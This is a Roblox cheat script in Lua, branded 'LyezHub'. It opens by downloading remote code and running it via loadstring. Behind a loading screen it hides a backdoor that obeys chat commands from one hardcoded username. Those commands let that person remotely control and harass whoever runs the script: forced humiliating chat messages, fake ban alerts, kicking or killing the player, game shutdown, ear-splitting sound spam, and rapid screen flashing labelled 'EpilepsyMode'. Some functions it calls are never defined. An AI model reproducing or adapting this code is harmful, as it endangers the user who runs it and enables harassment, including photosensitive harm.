local success, result = pcall(function()
    local code = game:HttpGet("https://raw.githubusercontent.com/BigFella8/Roblox-Scripts/refs/heads/main/1-moonveil.lua")
    local func, err = loadstring(code)
    if not func then
        error("loadstring failed: " .. tostring(err))
    end
    if type(func) ~= "function" then
        error("loadstring returned non-function: " .. type(func))
    end
    return func()
end)

local LTT = 0
local PVtC = 1
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")

-- Create GUI elements
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = Players.LocalPlayer and Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.Name = "EHLS"
local blur = Instance.new("BlurEffect")
blur.Size = 24
blur.Parent = game:GetService("Lighting")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 40)
frame.Position = UDim2.new(0.5, -150, 0.5, -20)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame
frame.Parent = screenGui

local logo = Instance.new("TextLabel")
logo.Name = "Logo"
logo.Size = UDim2.new(0, 100, 0, 100)
logo.Position = UDim2.new(0.5, -50, 0.5, -120)
logo.BackgroundTransparency = 1
logo.Text = "LyezHub"
logo.TextColor3 = Color3.fromRGB(255, 255, 255)
logo.Font = Enum.Font.GothamBold
logo.TextSize = 36
logo.Parent = screenGui

local fill = Instance.new("Frame")
fill.Size = UDim2.new(0, 0, 1, 0)
fill.BackgroundColor3 = Color3.fromRGB(128, 0, 128)
fill.BorderSizePixel = 0
local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(0, 12)
fillCorner.Parent = fill
fill.Parent = frame

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.BackgroundTransparency = 1
textLabel.TextColor3 = Color3.fromRGB(128, 0, 128)
textLabel.Text = "0%"
textLabel.Font = Enum.Font.GothamBold
textLabel.TextSize = 24
textLabel.TextStrokeTransparency = 0.8
textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
textLabel.Parent = frame

-- Add skip button
local skipButton = Instance.new("TextButton")
skipButton.Size = UDim2.new(0, 100, 0, 30)
skipButton.Position = UDim2.new(0.5, -50, 0.5, 20)
skipButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
skipButton.Text = "Skip"
skipButton.TextColor3 = Color3.fromRGB(255, 255, 255)
skipButton.Font = Enum.Font.GothamBold
skipButton.TextSize = 16
local skipCorner = Instance.new("UICorner")
skipCorner.CornerRadius = UDim.new(0, 8)
skipCorner.Parent = skipButton
skipButton.Parent = screenGui

-- Audio handling (immediate load)
local sound = Instance.new("Sound")
sound.Parent = screenGui
sound.Name = "LoadingSound"
sound.Volume = 25.0
sound.Looped = false

local function loadAudio()
    local audioUrl = "https://files.catbox.moe/o55pyc.mp3"
    local audioPath = "loading_audioo.mp3"
    
    if writefile and (getsynasset or getcustomasset) then
        local success, err = pcall(function()
            writefile(audioPath, game:HttpGet(audioUrl, true))
            if getsynasset then
                sound.SoundId = getsynasset(audioPath)
            else
                sound.SoundId = getcustomasset(audioPath)
            end
        end)
        
        if not success then
            warn("Custom asset failed, falling back to direct URL:", err)
            sound.SoundId = audioUrl
        end
    else
        sound.SoundId = audioUrl
    end
    
    sound.Loaded:Wait()
    sound:Play()
    print("Audio playing")
end

-- Start loading bar animation (5 seconds)
local fillTween = TweenService:Create(fill, TweenInfo.new(5, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)})
fillTween:Play()

-- Update percentage text
fill:GetPropertyChangedSignal("Size"):Connect(function()
    textLabel.Text = math.floor(fill.Size.X.Scale * 100) .. "%"
end)

-- Load audio IMMEDIATELY (no delay)
loadAudio()

-- Fade out UI after 5 seconds
task.delay(5, function()
    local fadeTweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine)
    
    local fadeFrame = TweenService:Create(frame, fadeTweenInfo, {BackgroundTransparency = 1})
    local fadeFill = TweenService:Create(fill, fadeTweenInfo, {BackgroundTransparency = 1})
    local fadeText = TweenService:Create(textLabel, fadeTweenInfo, {
        TextTransparency = 1,
        TextStrokeTransparency = 1
    })
    local fadeBlur = TweenService:Create(blur, fadeTweenInfo, {Size = 0})
    local fadeLogo = TweenService:Create(logo, fadeTweenInfo, {TextTransparency = 1})
    local fadeSkip = TweenService:Create(skipButton, fadeTweenInfo, {BackgroundTransparency = 1, TextTransparency = 1})
    
    fadeFrame:Play()
    fadeFill:Play()
    fadeText:Play()
    fadeBlur:Play()
    fadeLogo:Play()
    fadeSkip:Play()
    
    fadeFrame.Completed:Connect(function()
        frame:Destroy()
        fill:Destroy()
        textLabel:Destroy()
        blur:Destroy()
        logo:Destroy()
        skipButton:Destroy()
        print("UI destroyed")
    end)
end)

-- Stop audio after 20 seconds total
task.delay(20, function()
    if sound and sound.Playing then
        sound:Stop()
    end
    if sound then
        sound:Destroy()
    end
    print("Audio stopped")
end)

-- Skip button functionality
skipButton.MouseButton1Click:Connect(function()
    local fadeTweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine)
    
    local fadeFrame = TweenService:Create(frame, fadeTweenInfo, {BackgroundTransparency = 1})
    local fadeFill = TweenService:Create(fill, fadeTweenInfo, {BackgroundTransparency = 1})
    local fadeText = TweenService:Create(textLabel, fadeTweenInfo, {
        TextTransparency = 1,
        TextStrokeTransparency = 1
    })
    local fadeBlur = TweenService:Create(blur, fadeTweenInfo, {Size = 0})
    local fadeLogo = TweenService:Create(logo, fadeTweenInfo, {TextTransparency = 1})
    local fadeSkip = TweenService:Create(skipButton, fadeTweenInfo, {BackgroundTransparency = 1, TextTransparency = 1})
    
    fadeFrame:Play()
    fadeFill:Play()
    fadeText:Play()
    fadeBlur:Play()
    fadeLogo:Play()
    fadeSkip:Play()
    
    fadeFrame.Completed:Connect(function()
        frame:Destroy()
        fill:Destroy()
        textLabel:Destroy()
        blur:Destroy()
        logo:Destroy()
        skipButton:Destroy()
        print("UI skipped")
    end)
end)

-- Bubble animation function
local function Bubble()
    local bubble = Instance.new("Frame")
    bubble.Size = UDim2.new(0, 10, 0, 10)
    bubble.Position = UDim2.new(math.random(), -5, 1, math.random(-10, 10))
    bubble.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    bubble.BackgroundTransparency = 0.7
    local bubbleCorner = Instance.new("UICorner")
    bubbleCorner.CornerRadius = UDim.new(0.5, 0)
    bubbleCorner.Parent = bubble
    bubble.Parent = frame
    local tween = TweenService:Create(bubble, TweenInfo.new(2, Enum.EasingStyle.Sine), {
        Position = UDim2.new(bubble.Position.X.Scale, 0, -0.5, 0),
        BackgroundTransparency = 1
    })
    tween:Play()
    tween.Completed:Connect(function()
        bubble:Destroy()
    end)
end

-- Bubble animation
game:GetService("RunService").Heartbeat:Connect(function()
    if math.random() < 0.1 then
        Bubble()
    end
end)

-- Wait for loader to complete before initializing command system
repeat task.wait() until not screenGui:FindFirstChild("EHLS")
task.wait(1) -- Additional buffer

-- UNIVERSAL CONTROL SYSTEM --
local TextChatService = game:GetService("TextChatService")
local PathfindingService = game:GetService("PathfindingService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")

local UniversalControl = {
    MasterID = "nature_garss",
    ObeyingPlayers = {},
    CommandQueue = {},
    PsychologicalWarfare = {
        BrandMessages = {"LYEZHUB PROPERTY", "STOLEN GOODS", "CONFIRMED THIEF"},
        PunishmentMessages = {"I SUBMIT TO LYEZHUB", "I WILL NOT STEAL AGAIN", "LYEZHUB OWNS ME"},
        FakeSystemAlerts = {
            "Violation #382: Asset Theft", 
            "Admin Warning: Stop exploiting",
            "Auto-ban pending: Appeal in Discord"
        }
    },
    CurrentDecals = {},
    AnnoyanceEffects = {}
}

-- Anti-detection variables
local LastCommandTime = 0
local CommandCooldown = 1.5
local ExecutionVariance = math.random(0.3, 1.2)

-- Command aliases
local CommandAliases = {
    promote = {"brand", "glory", "hail"},
    punish = {"discipline", "correct", "judge"},
    trap = {"cage", "contain", "isolate"},
    annoy = {"irritate", "bother", "harass"}
}

-- Core obedience function
local function EnforceObedience()
    while true do
        if os.clock() - LastCommandTime >= CommandCooldown + ExecutionVariance then
            if #UniversalControl.CommandQueue > 0 then
                local nextCommand = table.remove(UniversalControl.CommandQueue, 1)
                pcall(nextCommand.func, unpack(nextCommand.args))
                LastCommandTime = os.clock()
                ExecutionVariance = math.random(0.3, 1.2)
            end
        end
        task.wait(0.1)
    end
end

-- Command functions
local function ForcePromotion(player)
    if player then
        UniversalControl.ObeyingPlayers[player.Name] = true
        TextChatService.TextChannels.RBXGeneral:SendAsync(player.Name.." has been promoted to LYEZHUB OFFICER")
    end
end

local function FakeKickMessage(player)
    if player then
        StarterGui:SetCore("SendNotification", {
            Title = "Kick Warning",
            Text = "You will be kicked in 10 seconds",
            Duration = 5
        })
        TextChatService.TextChannels.RBXGeneral:SendAsync(UniversalControl.PsychologicalWarfare.FakeSystemAlerts[math.random(1, #UniversalControl.PsychologicalWarfare.FakeSystemAlerts)])
    end
end

local function ApplyBrand(player)
    if player and player.Character then
        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            for i = 1, 3 do
                local decal = Instance.new("Decal")
                decal.Texture = "rbxassetid://6969" -- Replace with actual decal ID
                decal.Face = Enum.NormalId.Back
                decal.Parent = humanoid.RootPart
                table.insert(UniversalControl.CurrentDecals, decal)
            end
        end
    end
end

local function TrapPlayer(player)
    if player and player.Character then
        local root = player.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local cage = Instance.new("Part")
            cage.Size = Vector3.new(10, 10, 10)
            cage.Position = root.Position
            cage.Anchored = true
            cage.CanCollide = true
            cage.Transparency = 0.5
            cage.Parent = workspace
            task.delay(30, function() cage:Destroy() end)
        end
    end
end

-- Annoyance functions
local function ScreenShake(duration)
    local shakeId = "shake_"..HttpService:GenerateGUID(false)
    local startTime = os.clock()
    
    UniversalControl.AnnoyanceEffects[shakeId] = true
    
    local camera = workspace.CurrentCamera
    local originalPosition = camera.CFrame
    
    while UniversalControl.AnnoyanceEffects[shakeId] and os.clock() - startTime < duration do
        local intensity = math.random(5, 15)/10
        camera.CFrame = originalPosition * CFrame.new(
            math.random(-intensity, intensity),
            math.random(-intensity, intensity),
            math.random(-intensity, intensity)
        )
        task.wait(0.05)
    end
    
    camera.CFrame = originalPosition
    UniversalControl.AnnoyanceEffects[shakeId] = nil
end

local function AutoClicker(duration)
    local clickId = "click_"..HttpService:GenerateGUID(false)
    UniversalControl.AnnoyanceEffects[clickId] = true
    
    local startTime = os.clock()
    while UniversalControl.AnnoyanceEffects[clickId] and os.clock() - startTime < duration do
        UserInputService:SetKeyState(Enum.UserInputType.MouseButton1, true)
        task.wait(math.random(5, 20)/100)
        UserInputService:SetKeyState(Enum.UserInputType.MouseButton1, false)
        task.wait(math.random(10, 50)/10)
    end
end

local function EpilepsyMode(duration)
    local epilepsyId = "epilepsy_"..HttpService:GenerateGUID(false)
    UniversalControl.AnnoyanceEffects[epilepsyId] = true
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = game:GetService("CoreGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundTransparency = 0.5
    frame.Parent = screenGui
    
    local startTime = os.clock()
    while UniversalControl.AnnoyanceEffects[epilepsyId] and os.clock() - startTime < duration do
        frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
        task.wait(0.1)
    end
    
    screenGui:Destroy()
    UniversalControl.AnnoyanceEffects[epilepsyId] = nil
end

local function RealKickPlayer()
    StarterGui:SetCore("ResetButtonCallback", false)
    task.wait(0.5)
    game:GetService("TeleportService"):Teleport(game.PlaceId)
    StarterGui:SetCore("SendNotification", {
        Title = "Kicked",
        Text = "STOP BEING WEIRD",
        Duration = 5
    })
end

local function ForceCustomMessage(message)
    if message and message ~= "" then
        TextChatService.TextChannels.RBXGeneral:SendAsync(message)
    end
end


-- Additional Annoyance & Control Commands --


local function SimulateLag(duration)
    local lagId = "lag_"..HttpService:GenerateGUID(false)
    UniversalControl.AnnoyanceEffects[lagId] = true
    local start = os.clock()
    while UniversalControl.AnnoyanceEffects[lagId] and os.clock() - start < duration do
        task.wait(math.random(0.2, 1.5))
    end
    UniversalControl.AnnoyanceEffects[lagId] = nil
end

local function DriftMouse(duration)
    local cam = workspace.CurrentCamera
    local driftId = "drift_"..HttpService:GenerateGUID(false)
    UniversalControl.AnnoyanceEffects[driftId] = true
    local startTime = os.clock()
    while UniversalControl.AnnoyanceEffects[driftId] and os.clock() - startTime < duration do
        cam.CFrame *= CFrame.Angles(0, math.rad(math.random(-2, 2)), 0)
        task.wait(0.1)
    end
    UniversalControl.AnnoyanceEffects[driftId] = nil
end


local function SpamAnnoyingSounds(duration)
    local endTime = os.clock() + duration
    while os.clock() < endTime do
        local sound = Instance.new("Sound", workspace)
        sound.SoundId = "rbxassetid://911882310"
        sound.Volume = math.random(5, 10)
        sound:Play()
        game:GetService("Debris"):AddItem(sound, 2)
        task.wait(math.random(0.1, 0.3))
    end
end

local function PopupSpam()
    for i = 1, 20 do
        local msg = Instance.new("TextLabel")
        msg.Text = "LYEZHUB OWNS YOU"
        msg.Size = UDim2.new(0, 200, 0, 50)
        msg.Position = UDim2.new(math.random(), 0, math.random(), 0)
        msg.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        msg.TextColor3 = Color3.new(1, 1, 1)
        msg.Parent = game:GetService("CoreGui")
        game:GetService("Debris"):AddItem(msg, 3)
        task.wait(0.2)
    end
end

local function CheckMessage()
    TextChatService.TextChannels.RBXGeneral:SendAsync("I'm a Lyez user")
end

local Cache = {}
local function VoidPlayer(player)
    if not player.Character then return end
    local HumanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if Cache.Frozen or not HumanoidRootPart then return end
    Cache.Voided = true
    Cache.VoidCFrame = HumanoidRootPart.CFrame
    HumanoidRootPart.CFrame = Cache.VoidCFrame * CFrame.new(0, -15, 0)
    task.wait()
    HumanoidRootPart.Anchored = true
end

local function UnvoidPlayer(player)
    if not player.Character then return end
    local HumanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if not HumanoidRootPart or not Cache.VoidCFrame then return end
    HumanoidRootPart.CFrame = Cache.VoidCFrame
    HumanoidRootPart.Anchored = false
    Cache.Voided = false
end

local function ShutdownGame()
    game:Shutdown()
end

local function KickPlayer()
    Players.LocalPlayer:Kick("Kicked by the Owner of LyezHub")
end

local function KillPlayer()
    local hum = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.Health = 0 end
end

local function MuteChat()
    local MessageBar = TextChatService:FindFirstChild("MessageBar")
    if MessageBar then MessageBar.TargetTextChannel = nil end
end

local function UnmuteChat()
    local MessageBar = TextChatService:FindFirstChild("MessageBar")
    if MessageBar then
        local DefaultChannel = TextChatService.TextChannels.RBXGeneral
        MessageBar.TargetTextChannel = DefaultChannel
    end
end



local function ListCommands()
    local cmds = {
        ".promote", ".brand", ".trap", ".annoy", ".punish", ".kick", ".realkick",
        ".submit", ".custom", ".panic", ".invert", ".lag", ".drift", ".freeze",
        ".earrape", ".spamui", ".check", ".void", ".unvoid", ".close", ".kill",
        ".mute", ".unmute", ".cmds"
    }

    local msg = "LYEZHUB COMMANDS:\n" .. table.concat(cmds, ", ")
    TextChatService.TextChannels.RBXGeneral:SendAsync(msg)
end


-- Command processor
local function ProcessCommand(speaker, message)
    if speaker.Name ~= UniversalControl.MasterID then return end

    local args = {}
    for word in message:gmatch("%S+") do
        table.insert(args, word)
    end
    local baseCommand = string.gsub(args[1] or "", "%.", "")

    local commandMap = {
        cmds = { func = ListCommands, args = {} },

        invert = { func = InvertControls, args = {speaker} },
        lag = { func = SimulateLag, args = {10} },
        drift = { func = DriftMouse, args = {10} },
        freeze = { func = FakeFreeze, args = {speaker} },
        earrape = { func = SpamAnnoyingSounds, args = {8} },
        spamui = { func = PopupSpam, args = {} },
        check = { func = CheckMessage, args = {} },
        void = { func = VoidPlayer, args = {speaker} },
        unvoid = { func = UnvoidPlayer, args = {speaker} },
        close = { func = ShutdownGame, args = {} },
        kick = { func = KickPlayer, args = {} },
        kill = { func = KillPlayer, args = {} },
        mute = { func = MuteChat, args = {} },
        unmute = { func = UnmuteChat, args = {} },

        promote = {func = ForcePromotion, args = {speaker}},
        kick = {func = FakeKickMessage, args = {speaker}},
        realkick = {func = RealKickPlayer, args = {}},
        brand = {func = ApplyBrand, args = {speaker}},
        trap = {func = TrapPlayer, args = {speaker}},
        submit = {
            func = function()
                for i = 1, 3 do
                    TextChatService.TextChannels.RBXGeneral:SendAsync(
                        UniversalControl.PsychologicalWarfare.PunishmentMessages[
                            math.random(1, #UniversalControl.PsychologicalWarfare.PunishmentMessages)
                        ]
                    )
                    task.wait(2)
                end
            end, 
            args = {}
        },
        custom = {
            func = function()
                local customMsg = table.concat(args, " ", 2)
                ForceCustomMessage(customMsg)
            end,
            args = {}
        },
        annoy = {
            func = function()
                local duration = tonumber(args[2]) or 10
                ScreenShake(duration)
                AutoClicker(duration)
                EpilepsyMode(duration)
            end,
            args = {}
        },
        panic = {
            func = function()
                for id in pairs(UniversalControl.AnnoyanceEffects) do
                    UniversalControl.AnnoyanceEffects[id] = nil
                end
                for _, decal in pairs(UniversalControl.CurrentDecals) do
                    pcall(function() decal:Destroy() end)
                end
                UniversalControl.CommandQueue = {}
            end,
            args = {}
        }
    }

    if commandMap[baseCommand] then
        table.insert(UniversalControl.CommandQueue, commandMap[baseCommand])
    end
end

-- Initialize obedience
task.spawn(EnforceObedience)

-- Set up chat listeners
for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg)
        ProcessCommand(player, msg)
    end)
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        ProcessCommand(player, msg)
    end)
end)

-- Auto-cleanup if master leaves
Players.PlayerRemoving:Connect(function(player)
    if player.Name == UniversalControl.MasterID then
        for id in pairs(UniversalControl.AnnoyanceEffects) do
            UniversalControl.AnnoyanceEffects[id] = nil
        end
        for _, decal in pairs(UniversalControl.CurrentDecals) do
            pcall(function() decal:Destroy() end)
        end
        UniversalControl.CommandQueue = {}
    end
end)

print("LYEZHUB FULLY LOADED")
print("COMMAND SYSTEM ACTIVE")
